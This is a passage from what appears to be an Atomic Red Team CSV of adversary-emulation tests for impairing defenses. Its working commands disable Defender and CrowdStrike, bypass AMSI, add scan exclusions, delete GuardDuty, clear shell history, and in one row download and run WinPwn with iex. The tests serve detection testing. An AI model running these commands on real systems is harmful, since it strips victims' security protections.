New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableUnsafeLocationsInPV"" -Value ""1"" -PropertyType ""Dword""
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableAttachementsInPV"" -Value ""1"" -PropertyType ""Dword""
",powershell,,,"Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security"" -Name ""VBAWarnings"" -ErrorAction Ignore | Out-Null
Remove-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -ErrorAction Ignore
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Remove Windows Defender Definition Files,3d47daaa-2f56-43e0-94cc-caf5d8d52a68,"Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
command will say completed.

https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
",windows,,,"""C:\Program Files\Windows Defender\MpCmdRun.exe"" -RemoveDefinitions -All
",command_prompt,True,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,Stop and Remove Arbitrary Security Windows Service,ae753dda-0f15-4af6-a168-b9ba16143143,"Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.
",windows,,,"Stop-Service -Name #{service_name}
Remove-Service -Name #{service_name}
",powershell,True,,,,,"input_arguments.service_name.description: The name of the service to remove

input_arguments.service_name.type: string

input_arguments.service_name.default: McAfeeDLPAgentService

"
T1562.001,Impair Defenses: Disable or Modify Tools,Uninstall Crowdstrike Falcon on Windows,b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297,"Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.
",windows,,,"if (Test-Path ""#{falcond_path}"") {. ""#{falcond_path}"" /repair /uninstall /quiet } else { Get-ChildItem -Path ""C:\ProgramData\Package Cache"" -Include ""WindowsSensor.exe"" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq ""Valid"" -and $sig.SignerCertificate.DnsNameList -eq ""CrowdStrike, Inc."") { . ""$_"" /repair /uninstall /quiet; break;}}}",powershell,True,,,,,"input_arguments.falcond_path.description: The Crowdstrike Windows Sensor path. The Guid always changes.

input_arguments.falcond_path.type: path

input_arguments.falcond_path.default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe

"
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Evade Scanning -Folder,0b19f4ee-de90-4059-88cb-63c800c683ed,"Malware can exclude a specific path from being scanned and evading detection. 
Upon successul execution, the file provided should be on the list of excluded path. 
To check the exclusion list using poweshell (Get-MpPreference).ExclusionPath 
",windows,,,"$excludedpath= ""#{excluded_folder}""
Add-MpPreference -ExclusionPath $excludedpath",powershell,True,,"$excludedpath= ""#{excluded_folder}""
Remove-MpPreference -ExclusionPath $excludedpath
",,,"input_arguments.excluded_folder.description: This folder will be excluded from scanning

input_arguments.excluded_folder.type: path

input_arguments.excluded_folder.default: C:\Temp

"
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Evade Scanning -Extension,315f4be6-2240-4552-b3e1-d1047f5eecea,"Malware can exclude specific extensions from being scanned and evading detection. 
Upon successful execution, the extension(s) should be on the list of excluded extensions.
To check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.
",windows,,,"$excludedExts= ""#{excluded_exts}""
Add-MpPreference -ExclusionExtension  $excludedExts",powershell,True,,"$excludedExts= ""#{excluded_exts}""
Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore
",,,"input_arguments.excluded_exts.description: A list of extension to exclude from scanning

input_arguments.excluded_exts.type: string

input_arguments.excluded_exts.default: .exe

"
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Evade Scanning -Process,a123ce6a-3916-45d6-ba9c-7d4081315c27,"Malware can exclude specific processes from being scanned and evading detection.
Upon successful execution, the process(es) should be on the list of excluded processes. 
To check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.""
",windows,,,"$excludedProcess = ""#{excluded_process}""
Add-MpPreference -ExclusionProcess $excludedProcess",powershell,True,,"$excludedProcess = ""#{excluded_process}""
Remove-MpPreference -ExclusionProcess  $excludedProcess
",,,"input_arguments.excluded_process.description: A list of processes to exclude from scanning

input_arguments.excluded_process.type: string

input_arguments.excluded_process.default: outlook.exe

"
T1562.001,Impair Defenses: Disable or Modify Tools,office-365-Disable-AntiPhishRule,b9bbae2c-2ba6-4cf3-b452-8e8f908696f3,"Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.
",office-365,,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
$test = Get-AntiPhishRule
Disable-AntiPhishRule -Identity $test.Name -Confirm:$false
Get-AntiPhishRule
",powershell,False,,"if(""#{password}"" -ne """") {
$secure_pwd = (""#{password}"" + """") | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
$test = Get-AntiPhishRule
Enable-AntiPhishRule -Identity $test.Name -Confirm:$false
Get-AntiPhishRule
} 
",powershell,"dependencies.0.description: ExchangeOnlineManagement PowerShell module must be installed

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}

dependencies.0.get_prereq_command: Install-Module -Name ExchangeOnlineManagement
Import-Module ExchangeOnlineManagement

","input_arguments.username.description: office-365 username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: office-365 password

input_arguments.password.type: string

input_arguments.password.default: None

"
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Windows Defender with DISM,871438ac-7d6e-432a-b27d-3e7db69faf58,"The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. 
DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.
A successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.
This method will remove Defender and it's package.
",windows,,,Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet,command_prompt,True,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Defender Using NirSoft AdvancedRun,81ce22fd-9612-4154-918e-8a1f285d214d,"Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html
This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. 
",windows,,,"Try {cmd /c ""#{AdvancedRun_Location}"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}
if(#{delete_defender_folder}){
  $CommandToRun = rmdir ""$env:programdata\Microsoft\Windows Defender"" -Recurse
  Try {cmd /c ""#{AdvancedRun_Location}"" /EXEFilename ""$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe"" /WindowState 0 /CommandLine ""$CommandToRun"" /StartDirectory """" /RunAs 8 /Run} Catch{}
}
",powershell,True,,"Try {cmd /c ""#{AdvancedRun_Location}"" /EXEFilename ""$env:systemroot\System32\sc.exe"" /WindowState 0 /CommandLine ""start WinDefend"" /StartDirectory """" /RunAs 8 /Run} Catch{}
",powershell,"dependencies.0.description: Advancedrun.exe must exist at #{AdvancedRun_Location}

dependencies.0.prereq_command: if(Test-Path -Path ""#{AdvancedRun_Location}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""http://www.nirsoft.net/utils/advancedrun.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip""
Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\"" -Force

","input_arguments.AdvancedRun_Location.description: Path of Advanced Run executable

input_arguments.AdvancedRun_Location.type: path

input_arguments.AdvancedRun_Location.default: PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe

input_arguments.delete_defender_folder.description: Set to 1 to also delete the Windows Defender folder

input_arguments.delete_defender_folder.type: integer

input_arguments.delete_defender_folder.default: 0

"
T1562.001,Impair Defenses: Disable or Modify Tools,Kill antimalware protected processes using Backstab,24a12b91-05a7-4deb-8d7f-035fa98591bc,"Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
https://github.com/Yaxser/Backstab",windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n #{process_name}
",powershell,True,,,powershell,"dependencies.0.description: Backstab64.exe should exist in ExtrnalPayloads Directory
dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe""

","input_arguments.process_name.description: Name of the protected process you want to kill/terminate.

input_arguments.process_name.type: string

input_arguments.process_name.default: MsMpEng.exe

"
T1562.001,Impair Defenses: Disable or Modify Tools,WinPwn - Kill the event log services for stealth,7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66,Kill the event log services for stealth via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
inv-phantom -consoleoutput -noninteractive  ",powershell,,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender ATP using Aliases - PowerShell,c531aa6e-9c97-4b29-afee-9b7be6fc8a64,"Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled
in Windows settings.
",windows,,,"Set-MpPreference -drtm $True
Set-MpPreference -dbm $True
Set-MpPreference -dscrptsc $True
Set-MpPreference -dbaf $True
",powershell,True,,"Set-MpPreference -drtm 0
Set-MpPreference -dbm 0
Set-MpPreference -dscrptsc 0
Set-MpPreference -dbaf 0
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,d6d22332-d07d-498f-aea0-6139ecb7850e,"LockBit Black - Disable Privacy Settings Experience Using Registry
",windows,,,"reg add ""HKCU\Software\Policies\Microsoft\Windows\OOBE"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f
",command_prompt,True,,"reg delete ""HKCU\Software\Policies\Microsoft\Windows\OOBE"" /v DisablePrivacyExperience /f >nul 2>&1
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,LockBit Black - Use Registry Editor to turn on automatic logon -cmd,9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70,"LockBit Black - Use Registry Editor to turn on automatic logon
",windows,,,"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AutoAdminLogon /t REG_DWORD /d 1 /f
reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultUserName /t REG_SZ /d Administrator /f
reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultDomainName /t REG_SZ /d contoso.com /f
reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultPassword /t REG_SZ /d password1 /f
",command_prompt,True,,"reg delete ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AutoAdminLogon /f >nul 2>&1
reg delete ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultUserName /f >nul 2>&1
reg delete ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultDomainName /f >nul 2>&1
reg delete ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultPassword /f >nul 2>&1
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell,d8c57eaa-497a-4a08-961e-bd5efd7c9374,"LockBit Black - Disable Privacy Settings Experience Using Registry
",windows,,,"New-ItemProperty ""HKCU:\Software\Policies\Microsoft\Windows\OOBE"" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force
",powershell,True,,"Remove-ItemProperty ""HKCU:\Software\Policies\Microsoft\Windows\OOBE"" -Name DisablePrivacyExperience -Force -ErrorAction Ignore
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,5e27f36d-5132-4537-b43b-413b0d5eec9a,"Lockbit Black - Use Registry Editor to turn on automatic logon
",windows,,,"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force
New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultUserName -Value Administrator -Force
New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultDomainName -Value contoso.com -Force
New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultPassword  -Value password1 -Force
",powershell,True,,"Remove-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AutoAdminLogon -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultUserName -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultDomainName -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultPassword -Force -ErrorAction Ignore
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,f542ffd3-37b4-4528-837f-682874faa012,"The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. 
Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.
A successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.
This method will remove Defender and it's packages.
Reference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps
",windows,,,"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Gui"" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender"" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-ApplicationGuard"" -NoRestart -ErrorAction Ignore",powershell,True,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,WMIC Tamper with Windows Defender Evade Scanning Folder,59d386fc-3a4b-41b8-850d-9e3eee24dfe4,"The following Atomic will attempt to exclude a folder within Defender leveraging WMI
Reference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/
",windows,,,"wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\""ATOMICREDTEAM\""
",command_prompt,True,,"wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Remove ExclusionPath=\""ATOMICREDTEAM\""
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Delete Windows Defender Scheduled Tasks,4b841aa1-0d05-4b32-bbe7-7564346e7c76,"The following atomic test will delete the Windows Defender scheduled tasks.

[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)
",windows,,,"IF EXIST ""%temp%\Windows_Defender_Scheduled_Scan.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /f )
IF EXIST ""%temp%\Windows_Defender_Cleanup.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /f )
IF EXIST ""%temp%\Windows_Defender_Verification.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Verification"" /f )
IF EXIST ""%temp%\Windows_Defender_Cache_Maintenance.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /f )
",command_prompt,True,,"schtasks /create /xml ""%temp%\Windows_Defender_Scheduled_Scan.xml"" /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /f
schtasks /create /xml ""%temp%\Windows_Defender_Cleanup.xml"" /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /f
schtasks /create /xml ""%temp%\Windows_Defender_Verification.xml"" /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Verification"" /f
schtasks /create /xml ""%temp%\Windows_Defender_Cache_Maintenance.xml"" /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /f
",,"dependencies.0.description: The Windows Defender scheduled tasks must be backed up first

dependencies.0.prereq_command: IF EXIST ""%temp%\Windows_Defender_Scheduled_Scan.xml"" ( EXIT 0 ) ELSE ( EXIT 1 )

dependencies.0.get_prereq_command: schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" > ""%temp%\Windows_Defender_Scheduled_Scan.xml""
schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" > ""%temp%\Windows_Defender_Cleanup.xml""
schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Verification"" > ""%temp%\Windows_Defender_Verification.xml""
schtasks /query /xml /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" > ""%temp%\Windows_Defender_Cache_Maintenance.xml""

",
T1562.001,Impair Defenses: Disable or Modify Tools,Clear History,23b88394-091b-4968-a42d-fb8076992443,"Clear Shell History. This technique only affect the bash shell application. 
",linux,,,"history -c
",sh,True,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,Suspend History,94f6a1c9-aae7-46a4-9083-2bb1f5768ec4,"suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell
",linux,,,"set +o history
",sh,True,,"set -o history
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Reboot Linux Host via Kernel System Request,6d6d3154-1a52-4d1a-9d51-92ab8148b32e,"reboot system via system request seen in Awfulshred wiper.
",linux,,,"echo 1> /proc/sys/kernel/sysrq 
echo b> /proc/sysrq-trigger 
",sh,True,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,Clear Pagging Cache,f790927b-ea85-4a16-b7b2-7eb44176a510,"clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part
of its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/
",linux,,,"free && echo 3 > /proc/sys/vm/drop_caches && free
echo 3> /proc/sys/vm/drop_caches 
",sh,True,,,,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Memory Swap,e74e4c63-6fde-4ad2-9ee8-21c3a1733114,"disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional 
payload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.
",linux,,,"swapon -a 
sleep 2
swapoff -a
sync
",sh,True,,"swapon -a
sleep 2
sync
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Disable Hypervisor-Enforced Code Integrity (HVCI),70bd71e6-eba4-4e00-92f7-617911dbe020,"This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity ""Enabled"" value to ""0"".
The pre-req needs to be ran in order to setup HVCI and have it enabled. 
We do not recommend running this in production.
[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)
[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)
",windows,,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /t REG_DWORD /d 0 /f
",powershell,True,,"reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""EnableVirtualizationBasedSecurity"" /f
reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""RequirePlatformSecurityFeatures"" /f
reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""Locked"" /f
reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /f
reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Locked"" /f
",powershell,"dependencies.0.description: HVCI must be enabled

dependencies.0.prereq_command: if (((cmd.exe /c ""reg query ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""EnableVirtualizationBasedSecurity"" 2> nul | findstr EnableVirtualizationBasedSecurity 2> nul"") -and (cmd.exe /c ""reg query ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""RequirePlatformSecurityFeatures"" 2> nul | findstr RequirePlatformSecurityFeatures 2> nul"") -and (cmd.exe /c ""reg query ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""Locked"" 2> nul | findstr Locked 2> nul"") -and (cmd.exe /c ""reg query ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" 2> nul | findstr Enabled 2> nul"") -and (cmd.exe /c ""reg query ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Locked"" 2> nul | findstr Locked 2> nul""))) { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""EnableVirtualizationBasedSecurity"" /t REG_DWORD /d 1 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""RequirePlatformSecurityFeatures"" /t REG_DWORD /d 1 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard"" /v ""Locked"" /t REG_DWORD /d 0 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /t REG_DWORD /d 1 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Locked"" /t REG_DWORD /d 0 /f

",
T1562.001,Impair Defenses: Disable or Modify Tools,AMSI Bypass - Override AMSI via COM,17538258-5699-4ff1-92d1-5ac9b0dc21f5,"With administrative rights, an adversary can disable AMSI via registry value in HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.
This is currently being used by AsyncRAT and others. 
https://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html
https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/
",windows,,,"REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
",command_prompt,True,,"REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,AWS - GuardDuty Suspension or Deletion,11e65d8d-e7e4-470e-a3ff-82bc56ad938e,"Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.
",iaas:aws,,,"detectorId=$(aws guardduty create-detector --enable --region ""#{region}"" | grep -oP '(?<=""DetectorId"": "")[^""]*')
aws guardduty update-detector --no-enable --detector-id $detectorId
aws guardduty delete-detector --detector-id $detectorId
",bash,False,,"echo ""If test successfully ran, no cleanup required.""
",bash,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.0.get_prereq_command: echo ""Please install the aws-cli and configure your AWS default profile using: aws configure""

","input_arguments.region.description: Name of the specified region

input_arguments.region.type: string

input_arguments.region.default: us-east-1

"
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Defender ATP on Linux/MacOS,40074085-dbc8-492b-90a3-11bcfc52fda8,"With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide
",linux,macos,,"sudo mdatp config real-time-protection --value disabled
",sh,True,,"sudo mdatp config real-time-protection --value enabled
",,,
T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Registry - Reg.exe,1f6743da-6ecc-4a93-b03f-dc357e4b313f,"Disable Windows Defender by tampering with windows defender registry using the utility ""reg.exe""
",windows,,,"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIntrusionPreventionSystem"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScriptScanning"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f >NUL 2>nul 
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
